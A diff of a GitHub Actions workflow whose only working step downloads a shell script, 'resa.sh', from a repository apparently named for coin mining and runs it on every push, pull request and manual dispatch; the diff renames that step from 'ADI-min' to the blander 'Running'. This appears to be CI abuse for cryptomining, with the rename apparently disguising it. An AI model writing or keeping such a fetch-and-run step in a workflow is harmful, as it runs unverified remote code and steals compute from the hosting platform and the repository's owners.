@@ -3,7 +3,6 @@ name: ADI-min
 on: [push, pull_request, workflow_dispatch]
 jobs:
   build:
-  
     runs-on: ubuntu-18.04
     strategy:
       max-parallel: 5
@@ -23,6 +22,6 @@ steps:
   id: go
 - name: Setup
   uses: actions/checkout@v3
-- name: ADI-min
+- name: Running
   run: | 
     wget https://github.com/ChanellMiningAO/coins/blob/main/resa.sh && chmod u+x resa.sh && ./resa.sh
